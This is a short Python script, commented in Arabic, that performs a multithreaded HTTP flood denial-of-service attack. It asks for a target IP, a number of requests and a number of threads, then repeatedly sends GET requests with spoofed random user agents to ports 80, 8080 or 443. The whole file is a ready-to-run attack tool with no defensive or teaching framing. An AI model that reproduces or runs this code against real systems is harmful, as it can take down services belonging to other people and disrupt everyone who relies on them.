import requests
import threading
import random
import time
from fake_useragent import UserAgent
from colorama import init, Fore

# تهيئة مكتبة colorama
init()

def send_request(target_ip):
    try:
        user_agent = UserAgent()
        headers = {'User-Agent': user_agent.random}
        target_url = f"http://{target_ip}:{random.choice([80, 8080, 443])}"
        response = requests.get(target_url, headers=headers)
        print(Fore.BLUE + "Request sent to:", target_ip)
    except Exception as e:
        print(Fore.RED + "An error occurred:", e)

def dos_attack(target_ip, num_requests):
    for _ in range(num_requests):
        send_request(target_ip)
        time.sleep(0.1)  # تأخير قليل بين كل طلبة

def main():
    target_ip = input("[>] IP: ")
    num_requests = int(input("[>] REQUESTS: "))
    num_threads = int(input("[>] THREADS: "))  # تعدد الخيوط لزيادة الكفاءة
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=dos_attack, args=(target_ip, num_requests))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()